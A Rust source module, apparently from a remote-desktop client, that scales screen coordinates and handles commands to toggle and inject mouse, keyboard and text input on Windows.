use std::sync::atomic::Ordering;

use crate::{
    commands::Ctx,
    protocol::{self, Obj},
};

pub fn resolve_point(display: usize, max_height: u32, x: i64, y: i64) -> (i32, i32) {
    #[cfg(windows)]
    {
        let (origin_x, origin_y, width, height) = crate::win::screen::display_origin(display);
        let scale = if max_height > 0 && height as u32 > max_height {
            height as f64 / max_height as f64
        } else {
            1.0
        };
        let scaled_x = (x as f64 * scale).round() as i32;
        let scaled_y = (y as f64 * scale).round() as i32;
        let absolute_x = (origin_x + scaled_x).clamp(origin_x, origin_x + width.saturating_sub(1));
        let absolute_y = (origin_y + scaled_y).clamp(origin_y, origin_y + height.saturating_sub(1));
        (absolute_x, absolute_y)
    }
    #[cfg(not(windows))]
    {
        let _ = (display, max_height);
        (x as i32, y as i32)
    }
}

pub async fn handle(ctx: Ctx) {
    let name = ctx.command.name.clone();
    match name.as_str() {
        "desktop_enable_mouse" => {
            let enabled = ctx.boolean_or("enabled", true);
            ctx.state
                .desktop_input
                .mouse
                .store(enabled, Ordering::Relaxed);
            ctx.out.result(&ctx.command, true, None).await;
        }
        "desktop_enable_keyboard" => {
            let enabled = ctx.boolean_or("enabled", true);
            ctx.state
                .desktop_input
                .keyboard
                .store(enabled, Ordering::Relaxed);
            ctx.out.result(&ctx.command, true, None).await;
        }
        "desktop_enable_cursor" => {
            let enabled = ctx.boolean_or("enabled", false);
            ctx.state
                .desktop_input
                .cursor
                .store(enabled, Ordering::Relaxed);
            ctx.state
                .desktop_settings
                .cursor
                .store(enabled, Ordering::Relaxed);
            ctx.out.result(&ctx.command, true, None).await;
        }
        "desktop_mouse_move" => {
            if ctx.state.desktop_input.mouse.load(Ordering::Relaxed) {
                let x = ctx.integer("x").unwrap_or(0);
                let y = ctx.integer("y").unwrap_or(0);
                let (absolute_x, absolute_y) = resolve_point(
                    ctx.state.desktop_settings.display.load(Ordering::Relaxed),
                    ctx.state.desktop_settings.max_height.load(Ordering::Relaxed),
                    x,
                    y,
                );
                #[cfg(windows)]
                crate::win::input::move_cursor(absolute_x, absolute_y);
            }
            ctx.out.result(&ctx.command, true, None).await;
        }
        "desktop_mouse_down" | "desktop_mouse_up" | "desktop_mouse_wheel" => {
            if ctx.state.desktop_input.mouse.load(Ordering::Relaxed) {
                let x = ctx.integer("x");
                let y = ctx.integer("y");
                if let (Some(x), Some(y)) = (x, y) {
                    let (absolute_x, absolute_y) = resolve_point(
                        ctx.state.desktop_settings.display.load(Ordering::Relaxed),
                        ctx.state.desktop_settings.max_height.load(Ordering::Relaxed),
                        x,
                        y,
                    );
                    #[cfg(windows)]
                    crate::win::input::move_cursor(absolute_x, absolute_y);
                }
                #[cfg(windows)]
                {
                    if name == "desktop_mouse_wheel" {
                        crate::win::input::mouse_wheel(ctx.integer("delta").unwrap_or(0) as i32);
                    } else {
                        let button = ctx.integer("button").unwrap_or(0);
                        crate::win::input::mouse_button(button, name == "desktop_mouse_down");
                    }
                }
            }
            ctx.out.result(&ctx.command, true, None).await;
        }
        "desktop_key_down" | "desktop_key_up" => {
            if ctx.state.desktop_input.keyboard.load(Ordering::Relaxed) {
                let code = ctx.string("code").unwrap_or("");
                #[cfg(windows)]
                {
                    let vk = crate::win::input::dom_code_to_vk(code);
                    if vk != 0 {
                        crate::win::input::key(vk, name == "desktop_key_down");
                    }
                }
            }
            ctx.out.result(&ctx.command, true, None).await;
        }
        "desktop_text" => {
            if ctx.state.desktop_input.keyboard.load(Ordering::Relaxed) {
                let text = ctx.string("text").unwrap_or("");
                #[cfg(windows)]
                crate::win::input::type_text(text);
            }
            ctx.out.result(&ctx.command, true, None).await;
        }
        _ => {
            ctx.out
                .send(
                    Obj::new()
                        .put(protocol::key_type(), protocol::s("command_result"))
                        .put(protocol::key_command_id(), protocol::s(&ctx.command.id))
                        .put(protocol::key_ok(), protocol::b(false))
                        .put(protocol::key_message(), protocol::s("unknown input command"))
                        .value(),
                )
                .await;
        }
    }
}
